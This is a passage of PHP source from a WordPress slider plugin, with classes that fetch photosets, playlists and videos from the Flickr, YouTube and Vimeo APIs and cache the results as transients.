  			'page'    => 1
		);
		
		//get photoset list
		$photo_sets_list = $this->call_flickr_api($photo_set_params);
		
		$return = array();
		foreach($photo_sets_list->photosets->photoset as $photo_set){
			if(empty($photo_set->title->_content)) $photo_set->title->_content = "";
			if(empty($photo_set->photos))  $photo_set->photos = 0;
			$return[] = '<option title="'.$photo_set->description->_content.'" '.selected( $photo_set->id , $current_photoset , false ).' value="'.$photo_set->id.'">'.$photo_set->title->_content.' ('.$photo_set->photos.' photos)</option>"';
		}
		return $return;
	}

	/**
	 * Get Photoset Photos
	 *
	 * @since    1.0.0
	 * @param    string    $photo_set_id 	Photoset ID
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_photo_set_photos($photo_set_id,$item_count=10){
		//photoset photos params
		$this->stream = array();
		$photo_set_params = $this->api_param_defaults + array(
			'method'  		=> 'flickr.photosets.getPhotos',
  			'photoset_id' 	=> $photo_set_id,
  			'per_page'		=> $item_count,
  			'page'    		=> 1,
  			'extras'		=> 'license, date_upload, date_taken, owner_name, icon_server, original_format, last_update, geo, tags, machine_tags, o_dims, views, media, path_alias, url_sq, url_t, url_s, url_q, url_m, url_n, url_z, url_c, url_l, url_o'
		);
		
		//get photo list
		$photo_set_photos = $this->call_flickr_api($photo_set_params);
		if(isset($photo_set_photos->photoset->photo))
			return $photo_set_photos->photoset->photo;
		else return '';
	}

	/**
	 * Get Groop Pool Photos
	 *
	 * @since    1.0.0
	 * @param    string    $group_id 	Photoset ID
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_group_photos($group_id,$item_count=10){
		//photoset photos params
		$group_pool_params = $this->api_param_defaults + array(
			'method'  		=> 'flickr.groups.pools.getPhotos',
  			'group_id' 	=> $group_id,
  			'per_page'		=> $item_count,
  			'page'    		=> 1,
  			'extras'		=> 'license, date_upload, date_taken, owner_name, icon_server, original_format, last_update, geo, tags, machine_tags, o_dims, views, media, path_alias, url_sq, url_t, url_s, url_q, url_m, url_n, url_z, url_c, url_l, url_o'
		);
		
		//get photo list
		$group_pool_photos = $this->call_flickr_api($group_pool_params);
		if(isset($group_pool_photos->photos->photo))
			return $group_pool_photos->photos->photo;
		else
			return '';
	}

	/**
	 * Get Gallery ID from its URL
	 *
	 * @since    1.0.0
	 * @param    string    $gallery_url URL of the Gallery
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_gallery_from_url($gallery_url){
		//gallery params
		$gallery_params = $this->api_param_defaults + array(
			'method'  => 'flickr.urls.lookupGallery',
  			'url' => $gallery_url,
		);
		
		//get gallery info
		$gallery_info = $this->call_flickr_api($gallery_params);
		if(isset($gallery_info->gallery->id))
			return $gallery_info->gallery->id;
		else return '';
	}

	/**
	 * Get Gallery Photos
	 *
	 * @since    1.0.0
	 * @param    string    $gallery_id 	flicker Gallery id (not name)
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_gallery_photos($gallery_id,$item_count=10){
		//gallery photos params
		$gallery_photo_params = $this->api_param_defaults + array(
			'method'  => 'flickr.galleries.getPhotos',
  			'gallery_id' => $gallery_id,
  			'extras'  => 'description, license, date_upload, date_taken, owner_name, icon_server, original_format, last_update, geo, tags, machine_tags, o_dims, views, media, path_alias, url_sq, url_t, url_s, url_q, url_m, url_n, url_z, url_c, url_l, url_o',
  			'per_page'=> $item_count,
  			'page' => 1
		);
		
		//get photo list
		$gallery_photos_list = $this->call_flickr_api($gallery_photo_params);
		if(isset($gallery_photos_list->photos->photo))
			return $gallery_photos_list->photos->photo;
		else return '';
	}

	/**
	 * Encode the flickr ID for URL (base58)
	 *
	 * @since    1.0.0
	 * @param    string    $num 	flickr photo id
	 */
	private function base_encode($num, $alphabet='123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ') {
		$base_count = strlen($alphabet);
		$encoded = '';
		while ($num >= $base_count) {
			$div = $num/$base_count;
			$mod = ($num-($base_count*intval($div)));
			$encoded = $alphabet[$mod] . $encoded;
			$num = intval($div);
		}
		if ($num) $encoded = $alphabet[$num] . $encoded;
		return $encoded;
	}
}	// End Class


/**
 * Youtube
 *
 * with help of the API this class delivers all kind of Images/Videos from youtube
 *
 * @package    socialstreams
 * @subpackage socialstreams/youtube
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderYoutube {

	/**
	 * API key
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $api_key    Youtube API key
	 */
	private $api_key;

	/**
	 * Channel ID
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $channel_id    Youtube Channel ID
	 */
	private $channel_id;

	/**
	 * Stream Array
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $stream    Stream Data Array
	 */
	private $stream;

	/**
	* Transient seconds
	*
	* @since    1.0.0
	* @access   private
	* @var      number    $transient Transient time in seconds
	*/
	private $transient_sec;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $api_key	Youtube API key.
	 */
	public function __construct($api_key,$channel_id,$transient_sec=1200) {
		$this->api_key = $api_key;
		$this->channel_id = $channel_id;
		$this->transient_sec = $transient_sec;
	}


	/**
	 * Get Youtube Playlists
	 *
	 * @since    1.0.0
	 */
	public function get_playlists(){
		//call the API and decode the response
		$url = "https://www.googleapis.com/youtube/v3/playlists?part=snippet&channelId=".$this->channel_id."&key=".$this->api_key;
		$rsp = json_decode(wp_remote_fopen($url));
		if(isset($rsp->items)){
			return $rsp->items;
		}else{
			return false;
		}
	}

	/**
	 * Get Youtube Playlist Items
	 *
	 * @since    1.0.0
	 * @param    string    $playlist_id 	Youtube Playlist ID
	 * @param    integer    $count 	Max videos count
	 */
	public function show_playlist_videos($playlist_id,$count=50){
		//call the API and decode the response
    if(empty($count)) $count = 50;
		$url = "https://www.googleapis.com/youtube/v3/playlistItems?part=snippet&playlistId=".$playlist_id."&maxResults=".$count."&fields=items%2Fsnippet&key=".$this->api_key;
		
		$transient_name = 'revslider_' . md5($url);

		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$rsp = json_decode(wp_remote_fopen($url));

		set_transient( $transient_name, $rsp->items, $this->transient_sec );
		return $rsp->items;
	}

	/**
	 * Get Youtube Channel Items
	 *
	 * @since    1.0.0
	 * @param    integer    $count 	Max videos count
	 */
	public function show_channel_videos($count=50){
    if(empty($count)) $count = 50;
		//call the API and decode the response
		$url = "https://www.googleapis.com/youtube/v3/search?part=snippet&channelId=".$this->channel_id."&maxResults=".$count."&key=".$this->api_key."&order=date";
		
		$transient_name = 'revslider_' . md5($url);
		
		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$rsp = json_decode(wp_remote_fopen($url));

		set_transient( $transient_name, $rsp->items, $this->transient_sec );
		return $rsp->items;
	}

	/**
	 * Get Playlists from Channel as Options for Selectbox
	 *
	 * @since    1.0.0
	 */
	public function get_playlist_options($current_playlist){
		$return = array();
		$playlists = $this->get_playlists();
		if(!empty($playlists)){
			foreach($playlists as $playlist){
				$return[] = '<option title="'.$playlist->snippet->description.'" '.selected( $playlist->id , $current_playlist , false ).' value="'.$playlist->id.'">'.$playlist->snippet->title.'</option>"';
			}
		}
		return $return;
	}
}	// End Class

/**
 * Vimeo
 *
 * with help of the API this class delivers all kind of Images/Videos from Vimeo
 *
 * @package    socialstreams
 * @subpackage socialstreams/vimeo
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderVimeo {
	/**
	 * Stream Array
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $stream    Stream Data Array
	 */
	private $stream;

	/**
	* Transient seconds
	*
	* @since    1.0.0
	* @access   private
	* @var      number    $transient Transient time in seconds
	*/
	private $transient_sec;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $api_key	Youtube API key.
	 */
	public function __construct($transient_sec=1200) {
		$this->transient_sec = $transient_sec;
	}

	/**
	 * Get Vimeo User Videos
	 *
	 * @since    1.0.0
	 */
	public function get_vimeo_videos($type,$value){
		//call the API and decode the response
		if($type=="user"){
			$url = "https://vimeo.com/api/v2/".$value."/videos.json";
		}
		else{
			$url = "https://vimeo.com/api/v2/".$type."/".$value."/videos.json";
		}
		
		$transient_name = 'revslider_' . md5($url);
		
		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$rsp = json_decode(wp_remote_fopen($url));
		set_transient( $transient_name, $rsp, $this->transient_sec );
		return $rsp;
	}
}	// End Class
?>